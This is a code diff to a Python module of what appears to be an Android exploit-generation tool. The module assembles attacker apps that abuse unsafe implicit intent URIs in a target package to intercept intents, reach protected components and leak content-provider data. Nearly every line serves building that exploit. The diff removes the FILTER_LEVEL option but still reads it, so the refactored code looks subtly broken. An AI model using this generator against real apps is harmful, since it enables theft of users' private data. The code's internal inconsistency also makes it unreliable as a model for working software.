@@ -15,7 +15,7 @@ class SherlockModule(App):
 
     def __init__(self):
         super().__init__()
-        self._id = "unsafe_intent_uri_implicit"
+        self._id = "unsafe_intent_uri_component_implicit"
         self._template = Template()
 
 
@@ -37,7 +37,6 @@ class SherlockModule(App):
             OptList("IPUT_EXTRA", [False, "Intercept intent extra data"]),
             OptList("COMPONENT_EXTRA", [False, "Protected component intent extra data"]),
             OptEnum("PROVIDER_TYPE", [False, "Content provider type (1: Share content, 2: Access to files)", "", [1, 2]]),
-            OptEnum("FILTER_LEVEL", [True, "WebView Intent URI filter level (0: No filter, 1: Filtered component) (Default: 0)", 0, [0, 1]]),
             OptEnum("RESULT_CODE", [True, "Result code returned to the caller (Default: -1)", -1, [-1, 0, 1, "RESULT_OK", "RESULT_FIRST_USER", "RESULT_CANCELED"]])
         ])
         self.update_option_status()
@@ -84,18 +83,22 @@ class SherlockModule(App):
         filter_level = opts['FILTER_LEVEL']
         result_code = opts['RESULT_CODE']
 
+        exploit_activity_name = self.activity_name(self._id, target_package)
+        intercept_activity_name = f'{self.activity_name(self._id, target_package)}Intercept'
+        leak_provider_activity_name = f'{self.activity_name(self._id, target_package)}LeakProvider'
+
         manifest = [
             self._template.build_manifest_component(
-                self.activity_name(self._id, target_package)
+                exploit_activity_name
             ),
             self._template.build_manifest_component(
-                self.intercept_activity_name(self._id, target_package), 
+                intercept_activity_name, 
                 is_exported=True,
                 intercept=True, 
                 action=intent_action
             ),
             self._template.build_manifest_component(
-                self.leak_provider_activity_name(self._id, target_package), 
+                leak_provider_activity_name, 
                 is_exported=True
             )
         ]
@@ -105,12 +108,12 @@ class SherlockModule(App):
             for extra in intercept_put_extra:
                 extras.append([extra[0], f'"{extra[1]}"'])
         if url_extra != "":
-            extras.append([url_extra, "url"])
+            extras.append([url_extra, "intentUri"])
         if bundle_extra != "":
             extras.append([bundle_extra, "bundle"])
 
         intercept_activity = self._template.build_activity(
-            name=self.intercept_activity_name(self._id, target_package),
+            name=intercept_activity_name,
             libs=[
                 "android.content.Intent",
                 "android.net.Uri",
@@ -121,17 +124,17 @@ class SherlockModule(App):
                 self._template.build_intent(
                     intent_var="target",
                     set_data=f'"{provider_uri}"' if leak_provider else None,
-                    set_selector=([self._package, f"{self._package}.{self.leak_provider_activity_name(self._id, target_package)}"] if leak_provider else [target_package, protected_component_class]) if filter_level == 1 else None,
+                    set_selector=([self._package, f"{self._package}.{leak_provider_activity_name}"] if leak_provider else [target_package, protected_component_class]) if filter_level == 1 else None,
                     put_extra=[[extra[0], f'"{extra[1]}"'] for extra in protected_component_extra] if protected_component_extra != "" else [],
-                    set_classname=[self._package, f"{self._package}.{self.leak_provider_activity_name(self._id, target_package)}"] if leak_provider else [target_package, protected_component_class],
+                    set_classname=[self._package, f"{self._package}.{leak_provider_activity_name}"] if leak_provider else [target_package, protected_component_class],
                     set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"] if leak_provider else [],
                     start_activity=False
                 ),
                 'String intentUri = target.toUri(Intent.URI_INTENT_SCHEME);',
-                'String url = "https://sherlock-93f40.web.app/?url=" + Uri.encode(intentUri);',
-                f'Bundle bundle = new Bundle();\nbundle.putString("{bundle_string}", url);' if bundle_string != "" else "",
+                'Bundle bundle = new Bundle();',
+                f'bundle.putString("{bundle_string}", intentUri);' if bundle_string != "" else "",
                 self._template.build_intent(
-                    set_data="url",
+                    set_data="intentUri",
                     put_extra=extras,
                     start_activity=False,
                     set_result=True,
@@ -142,7 +145,7 @@ class SherlockModule(App):
         )
 
         exploit_activity = self._template.build_activity(
-            name=self.activity_name(self._id, target_package),
+            name=exploit_activity_name,
             libs=[
                 "android.content.Context",
                 "android.content.Intent",
@@ -160,7 +163,7 @@ class SherlockModule(App):
         )
 
         leak_provider_activity = self._template.build_activity(
-            name=self.leak_provider_activity_name(self._id, target_package),
+            name=leak_provider_activity_name,
             libs=[
                 "android.content.Context",
                 "android.content.Intent",
@@ -187,15 +190,15 @@ class SherlockModule(App):
 
         component = [
             {
-                "name": f"{self.activity_name(self._id, target_package)}.java",
+                "name": f"{exploit_activity_name}.java",
                 "content": exploit_activity
             },
             {
-                "name": f"{self.intercept_activity_name(self._id, target_package)}.java",
+                "name": f"{intercept_activity_name}.java",
                 "content": intercept_activity
             },
             {
-                "name": f"{self.leak_provider_activity_name(self._id, target_package)}.java",
+                "name": f"{leak_provider_activity_name}.java",
                 "content": leak_provider_activity
             }
         ]
